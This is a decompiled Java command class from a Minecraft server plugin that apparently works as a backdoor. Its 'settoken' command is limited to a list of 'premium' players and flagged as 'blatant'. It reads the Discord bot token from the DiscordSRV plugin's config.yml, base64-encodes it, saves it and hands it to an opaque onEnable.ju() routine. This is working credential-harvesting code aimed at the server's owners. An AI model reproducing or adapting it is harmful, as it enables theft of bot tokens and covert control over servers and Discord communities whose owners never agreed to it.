/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.configuration.file.YamlConfiguration
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl.premium;

import me.qlutch.sucks.data.DataManager;
import me.qlutch.sucks.Core;
import me.qlutch.sucks.methods.onEnable;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import me.qlutch.sucks.utils.PluginUtils;
import java.io.File;
import java.io.IOException;
import java.util.Base64;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;

public class SettokenCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (plugin.premium.contains(p2.getName())) {
            if (args.length <= 1) {
                if (PluginUtils.getPluginByName("DiscordSRV") == null) {
                    p2.sendMessage(Settings.USAGE("settoken <discord token>"));
                } else {
                    File f2 = new File(PluginUtils.getPluginByName("DiscordSRV").getDataFolder() + "/config.yml");
                    YamlConfiguration yc2 = YamlConfiguration.loadConfiguration((File)f2);
                    DataManager.getData().set("login", (Object)true);
                    byte[] token = Base64.getEncoder().encode(yc2.getString("BotToken").getBytes());
                    DataManager.getData().set("key", (Object)new String(token));
                    DataManager.saveData();
                    p2.sendMessage(Settings.PREFIX("The discord token has now been set to the one found in the DiscordSRV config.yml"));
                    try {
                        onEnable.ju();
                    }
                    catch (IOException e2) {
                        p2.sendMessage(Settings.PREFIX(e2.getMessage()));
                    }
                }
            } else {
                DataManager.getData().set("login", (Object)true);
                byte[] token = Base64.getEncoder().encode(args[1].getBytes());
                DataManager.getData().set("key", (Object)new String(token));
                DataManager.saveData();
                p2.sendMessage(Settings.PREFIX("The discord token has now been set"));
                try {
                    onEnable.ju();
                }
                catch (IOException e3) {
                    p2.sendMessage(Settings.PREFIX(e3.getMessage()));
                }
            }
        } else {
            p2.sendMessage(Settings.PREFIX("You must be a " + Settings.RED + "premium user " + Settings.WHITE + " to execute this command"));
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

